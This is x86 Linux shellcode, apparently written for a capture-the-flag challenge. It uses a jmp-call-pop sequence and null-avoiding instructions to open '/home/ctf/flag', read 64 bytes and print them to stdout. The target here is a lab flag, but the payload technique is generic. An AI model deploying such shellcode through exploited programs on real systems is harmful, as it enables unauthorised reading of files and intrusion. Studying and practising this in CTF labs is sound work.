[global _start]
  
_start:
  jmp ed

st:
  ; open(const char *filename, int flags, int mode);
  pop ebx
  xor eax, eax
  add al, 5
  xor ecx, ecx
  xor edx, edx
  int 0x80

  ; read(int fd, const char *buf, size_t count);
  mov ebx, eax  ; fd is in eax
  xor eax, eax
  add al, 3
  sub esp, 64  ; allocate a buffer on stack
  mov ecx, esp
  xor edx, edx
  add dl, 64
  int 0x80

  ; write(int fd, const char *buf, size_t count);
  mov edx, eax
  xor eax, eax
  add al, 4
  xor ebx, ebx
  add bl, 1
  int 0x80
  ret
  nop

ed:
  call st
  db "/home/ctf/flag", 0
